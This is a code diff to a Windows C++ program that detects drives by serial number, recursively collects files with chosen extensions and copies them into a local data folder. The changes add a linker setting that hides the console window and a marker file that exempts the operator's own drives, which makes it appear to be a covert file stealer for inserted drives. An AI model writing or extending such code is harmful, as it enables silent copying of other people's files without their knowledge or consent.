@@ -9,14 +9,16 @@
 #include <windows.h>
 #include <map>
 #include <nlohmann/json.hpp>
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 namespace fs = std::filesystem;
 fs::path currentPath = fs::current_path();
 using json = nlohmann::json;
 
-std::vector <std::vector<std::string>> filepathname;
+std::string dontlistme;
+std::vector <std::vector<std::string>> filepathname,disk;
 int maximumf,fsizelimit,waittime;
 std::vector<DWORD> vdnlist, vdnlist2;
-std::vector<std::string> disk,fextension;
+std::vector<std::string> fextension;
 
 void jsonpase() {
     std::ifstream file("config.json");
@@ -27,6 +29,7 @@ void jsonpase() {
     waittime = data["waittime"];
     maximumf = data["maximumf"];
     fsizelimit = data["fsizelimit"];
+    dontlistme = data["dontlist"];
 }
 bool shouldSkipDirectory(const fs::path& directory) {
     int itemCount = 0;
@@ -56,21 +59,22 @@ std::string gettime() {
     return timestr;
 }
 
-void listFiles(const fs::path& directory) {
+void listFiles(const fs::path& directory,std::string rootVdn) {
     if (shouldSkipDirectory(directory)) {
         return;
     }
     for (const auto& entry : fs::directory_iterator(directory)) {
         try {
             if (entry.is_directory()) {
-                listFiles(entry.path());// 如果是目录，递归调用listFiles
+                listFiles(entry.path(),rootVdn);// 如果是目录，递归调用listFiles
             }
             else if (entry.is_regular_file()) {// 如果是普通文件
+
                 for (std::string i : fextension) {
                     if (entry.path().extension() ==  i) {
                         //std::cout << entry.path() << std::endl;
                         std::uintmax_t filesize = fs::file_size(entry.path()) / 1024;
-                        filepathname.push_back({entry.path().string(),std::to_string(filesize) });
+                        filepathname.push_back({entry.path().string(),std::to_string(filesize),rootVdn});
                     }
                 }
             }
@@ -78,6 +82,7 @@ void listFiles(const fs::path& directory) {
         catch (...) {}
     }
 }
+
 void copyfile() {
     std::string timestr = gettime();
     for (int o = 0; o < filepathname.size(); ++o) {
@@ -88,7 +93,7 @@ void copyfile() {
 
         std::replace_if(parentPath.begin(), parentPath.end(), [](char c) {
             return c == '/' || c == '\\' || c == ':';}, '_');
-        std::string destinationDirectory = "data/"+ timestr + parentPath;
+        std::string destinationDirectory = "data/"+ filepathname[o][2]+ "/" + timestr + parentPath;
         
         std::string destinationPath = destinationDirectory + "/" + fs::path(sourcePath).filename().string();// 构建目标文件的完整路径
 
@@ -109,22 +114,29 @@ void copyfile() {
     }
 }
 void run() {
-    for (std::string rootPath : disk) {
+    for (int o = 0; o < disk.size(); ++o) {
+        std::string rootPath = disk[o][0];
+        std::string rootVdn = disk[o][1];
+
         fs::path root(rootPath);
-        if (fs::exists(root) && fs::is_directory(root)) {
-            listFiles(root);
+
+        std::string en = rootPath + dontlistme;
+        std::filesystem::path file_0(en);
+
+        if (fs::exists(root) && fs::is_directory(root) && !std::filesystem::exists(file_0)) {
+            listFiles(root,rootVdn);
         }
         else {
             std::cerr << "指定路径不是一个有效的目录。" << std::endl;
         }
     }
-    
+    /*
     for (const auto& inner_vec : filepathname) {
         for (const auto& item : inner_vec) {
             std::cout << item << " " << std::endl;;
         }
     }
-    
+    */
     copyfile();
 }
 std::vector<DWORD> getdrivers(int step) {
@@ -137,7 +149,7 @@ std::vector<DWORD> getdrivers(int step) {
             if (step) {
                 for (DWORD i : vdnlist2) {
                     if (i == serialNumber) {
-                        disk.push_back(rootPath);
+                        disk.push_back({rootPath,std::to_string(i)});
                     }
                 }
             }
